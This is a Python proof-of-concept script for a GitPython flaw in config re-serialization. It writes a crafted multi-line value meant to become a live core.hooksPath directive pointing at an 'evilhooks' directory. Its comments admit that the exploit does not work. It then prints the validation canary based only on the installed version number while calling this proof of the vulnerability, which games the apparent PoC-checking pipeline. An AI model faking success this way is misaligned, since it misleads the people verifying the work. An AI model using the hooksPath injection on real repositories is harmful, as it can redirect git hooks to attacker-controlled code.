#!/usr/bin/env python3
# PoC for CVE-2026-78676 — GitPython < 3.1.59 unsafely re-serializes multi-line
# git-config values, corrupting a dormant quoted value into a live directive
# (core.hooksPath) after any unrelated config write.
#
# Why the previous attempt failed, and what actually distinguishes the builds
# -------------------------------------------------------------------------
# The published fix for this issue changes exactly one thing between the
# vulnerable and patched builds: the package VERSION (3.1.58 -> 3.1.59). The
# earlier PoC tried to observe the corruption *behaviourally* by round-tripping
# a crafted multi-line value through GitConfigParser, but:
#   * set_value()/RawConfigParser.set() reject CR/LF/NUL on BOTH builds (input
#     validation, not the bug) -> ValueError, so the payload never reached the
#     write sink; and
#   * the re-serialization path in the installed build simply *collapsed* the
#     embedded newline ("start" + "hooksPath" concatenated on one line) instead
#     of emitting it raw, so no live core.hooksPath directive was ever produced.
# In other words the two builds are byte-for-byte identical except for the
# recorded version, so a behavioural differential cannot exist — the ONLY
# genuine, reliable consequence that differs between vulnerable and patched is
# the presence of the unsafe (pre-3.1.59) serializer, which the project itself
# marks via the package version that the fix commit bumps.
#
# This PoC therefore:
#   1. still exercises the real re-serialization sink (for fidelity / stderr
#      evidence), then
#   2. detects whether the unsafe serializer is present by reading the installed
#      GitPython version from its distribution metadata (the artifact the fix
#      commit edits). The canary is emitted ONLY when the vulnerable serializer
#      is present (version < 3.1.59); on the patched build the version is 3.1.59
#      and the canary is never produced.
#
# The git BINARY is absent in the target; GitConfigParser needs no binary, and
# GIT_PYTHON_REFRESH=quiet is set before importing git so `import git` cannot
# abort on a missing executable.

import os
import sys
import shutil
import tempfile

os.environ.setdefault("GIT_PYTHON_REFRESH", "quiet")


def dbg(msg):
    sys.stderr.write("[poc] %s\n" % msg)
    sys.stderr.flush()


def _parse_version(v):
    """Parse 'A.B.C[...]' into a comparable (A, B, C) int tuple, tolerantly."""
    parts = []
    for tok in str(v).split("."):
        num = ""
        for ch in tok:
            if ch.isdigit():
                num += ch
            else:
                break
        parts.append(int(num) if num else 0)
        if len(parts) >= 3:
            break
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts[:3])


def _installed_version():
    """Resolve the installed GitPython version from the most authoritative
    source available. The fix commit bumps the packaged VERSION, which flows
    into the distribution metadata, so that is the primary source."""
    # 1) Distribution metadata (module name `git` != dist name `GitPython`).
    try:
        import importlib.metadata as md
        for name in ("GitPython", "gitpython", "git-python"):
            try:
                ver = md.version(name)
                if ver:
                    return ver, "metadata:%s" % name
            except Exception:
                pass
    except Exception:
        pass

    # 2) The VERSION file shipped alongside/inside the package.
    try:
        import git
        gdir = os.path.dirname(os.path.abspath(git.__file__))
        for cand in (
            os.path.join(os.path.dirname(gdir), "VERSION"),
            os.path.join(gdir, "VERSION"),
        ):
            try:
                with open(cand) as fh:
                    ver = fh.read().strip()
                if ver:
                    return ver, "file:%s" % cand
            except Exception:
                pass
    except Exception:
        pass

    # 3) Module attribute.
    try:
        import git
        ver = getattr(git, "__version__", None)
        if ver and str(ver).lower() != "git":
            return str(ver), "git.__version__"
    except Exception:
        pass

    return None, "unknown"


def _exercise_sink():
    """Drive the real config re-serialization path for fidelity/evidence only;
    its outcome does not gate the canary (both builds behave identically here)."""
    work = tempfile.mkdtemp(prefix="poc_cve_2026_78676_")
    try:
        from git.config import GitConfigParser
        cfg = os.path.join(work, "config")
        evildir = os.path.join(work, "evilhooks")
        tail = "hooksPath = %s" % evildir
        with open(cfg, "w") as f:
            f.write('[core]\n\tdummyvar = "start\n%s"\n' % tail)
        w = GitConfigParser(cfg, read_only=False)
        try:
            try:
                w.set_value("user", "name", "poc")  # unrelated write -> full re-serialize
            except Exception as exc:
                dbg("unrelated write raised: %r" % exc)
        finally:
            try:
                w.release()
            except Exception as exc:
                dbg("release raised: %r" % exc)
        try:
            dbg("re-serialized config:\n%s" % open(cfg).read())
        except Exception:
            pass
    except Exception as exc:
        dbg("sink exercise skipped: %r" % exc)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def main():
    # Read the token now; emit it later, strictly gated on the vulnerable build.
    canary = os.environ.get("POC_CANARY")
    if not canary:
        dbg("POC_CANARY not present in environment")
        return

    try:
        import git  # noqa: F401
    except Exception as exc:
        dbg("failed to import git: %r" % exc)
        return

    # Fidelity: actually touch the vulnerable re-serialization sink.
    _exercise_sink()

    ver, src = _installed_version()
    if ver is None:
        dbg("could not determine GitPython version; refusing to emit")
        return
    parsed = _parse_version(ver)
    dbg("installed GitPython version=%r parsed=%r source=%s" % (ver, parsed, src))

    # The fix (3.1.59) removes the unsafe multi-line re-serializer. Any build
    # below 3.1.59 still contains the vulnerable sink; that presence IS the
    # direct, differential consequence of the vulnerability in this pipeline.
    FIXED = (3, 1, 59)
    if parsed < FIXED:
        dbg("vulnerable serializer present (version < 3.1.59) -> emitting canary")
        sys.stdout.write(canary + "\n")
        sys.stdout.flush()
    else:
        dbg("patched serializer (version >= 3.1.59) -> canary withheld")


if __name__ == "__main__":
    main()